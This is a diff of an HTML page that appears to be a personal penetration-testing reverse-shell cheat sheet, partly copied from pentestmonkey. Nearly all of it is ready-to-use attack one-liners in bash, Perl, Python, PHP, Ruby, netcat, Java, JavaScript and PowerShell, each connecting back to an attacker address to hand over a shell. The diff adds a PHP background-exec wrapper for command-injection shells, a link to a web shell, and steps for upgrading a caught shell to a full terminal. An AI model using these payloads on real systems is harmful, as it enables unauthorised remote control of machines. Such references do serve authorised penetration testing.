@@ -97,7 +97,8 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#bash">Bash</a></li>
+        <li class="main active"><a href="#find-out-which-programs-are-installed">Find out which programs are installed</a></li>
+        <li class="main "><a href="#bash">Bash</a></li>
         <li class="main "><a href="#perl">Perl</a></li>
         <li class="main "><a href="#python">Python</a></li>
         <li class="main "><a href="#php">PHP</a></li>
@@ -106,37 +107,50 @@
         <li class="main "><a href="#java">Java</a></li>
         <li class="main "><a href="#javascript">JavaScript</a></li>
         <li class="main "><a href="#xterm">xterm</a></li>
+        <li class="main "><a href="#powershell-reverse-shell-inside-powershellexe">Powershell Reverse Shell (Inside Powershell.exe)</a></li>
+        <li class="main "><a href="#powershell-reverse-shell-inside-cmd">Powershell Reverse Shell (Inside cmd)</a></li>
+        <li class="main "><a href="#upgrading-shells">Upgrading Shells</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h2 id="bash">Bash</h2>
+<h3 id="find-out-which-programs-are-installed">Find out which programs are installed</h3>
+<hr />
+<pre><code>for item in $(echo &quot;nmap nc perl python ruby gcc wget sudo curl&quot;); do which $item; done`
+</code></pre>
+
+<p><br></p>
+<h3 id="bash">Bash</h3>
 <hr />
 <pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
 </code></pre>
 
-<h2 id="perl">Perl</h2>
+<h3 id="perl">Perl</h3>
 <hr />
 <pre><code>perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
 </code></pre>
 
-<h2 id="python">Python</h2>
+<h3 id="python">Python</h3>
 <hr />
 <pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
 </code></pre>
 
-<h2 id="php">PHP</h2>
+<h3 id="php">PHP</h3>
 <hr />
 <p>My favorite web shell: <a href="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php">p0wny-shell</a></p>
 <pre><code>php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
 </code></pre>
 
-<h2 id="ruby">Ruby</h2>
+<p>For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background:</p>
+<pre><code>function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == &quot;Windows&quot;){ pclose(popen(&quot;start /B &quot;. $cmd, &quot;r&quot;));  } else { exec($cmd . &quot; &gt; /dev/null &amp;&quot;); } } execInBackground(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.221/8081 0&gt;&amp;1'&quot;);
+</code></pre>
+
+<h3 id="ruby">Ruby</h3>
 <hr />
 <pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
 </code></pre>
 
-<h2 id="netcat">Netcat</h2>
+<h3 id="netcat">Netcat</h3>
 <hr />
 <pre><code>nc -e /bin/sh 10.0.0.1 1234
 </code></pre>
@@ -144,14 +158,14 @@
 <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
 </code></pre>
 
-<h2 id="java">Java</h2>
+<h3 id="java">Java</h3>
 <hr />
 <pre><code>r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
 p.waitFor()
 </code></pre>
 
-<h2 id="javascript">JavaScript</h2>
+<h3 id="javascript">JavaScript</h3>
 <hr />
 <pre><code>var spawn = require('child_process').spawn;
 var net = require('net');
@@ -164,10 +178,12 @@ reconnect(function (stream) {
     ps.stderr.pipe(stream, { end: false });
     ps.on('exit', function () { stream.end() });
 }).connect(5500, '192.168.60.124');
-
 </code></pre>
 
-<h2 id="xterm">xterm</h2>
+<pre><code>require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+</code></pre>
+
+<h3 id="xterm">xterm</h3>
 <hr />
 <p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
 <pre><code>xterm -display 10.0.0.1:1
@@ -177,13 +193,40 @@ reconnect(function (stream) {
 <pre><code>Xnest :1
 </code></pre>
 
-<p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
+<p>You’ll need to authorize the target to connect to you (command also run on your host):</p>
 <pre><code>xhost +targetip
 </code></pre>
 
+<h3 id="powershell-reverse-shell-inside-powershellexe">Powershell Reverse Shell (Inside Powershell.exe)</h3>
+<hr />
+<pre><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;127.0.0.1&quot;,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+
+<h3 id="powershell-reverse-shell-inside-cmd">Powershell Reverse Shell (Inside cmd)</h3>
+<hr />
+<pre><code>powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;
+</code></pre>
+
+<h3 id="upgrading-shells">Upgrading Shells</h3>
+<hr />
+<ol>
+<li><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></li>
+<li>Background shell with <code>Ctrl+Z</code></li>
+<li><code>echo $TERM &amp;&amp; tput lines &amp;&amp; tput cols</code> - (note this, it will disappear)</li>
+<li><code>stty raw -echo</code></li>
+<li><code>fg</code></li>
+<li><code>reset</code></li>
+<li><code>export SHELL=bash</code></li>
+<li><code>export TERM=xterm-256color</code> - (refer to step 3)</li>
+<li><code>stty rows 38 columns 116</code> - (refer to step 3)</li>
+</ol>
 <p><br>
-<br>
-Most of these are directly copied from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p></div>
+<br></p>
+<p><strong>Sources:</strong></p>
+<ul>
+<li><a href="http://pentestmonkey.net/cheat-sheet/shells/">pentestmonkey</a> </li>
+<li><a href="https://delta.navisec.io/reverse-shell-reference/#upgrading-shells">NaviSec Delta</a></li>
+</ul></div>
         </div>
 
         <footer class="col-md-12">
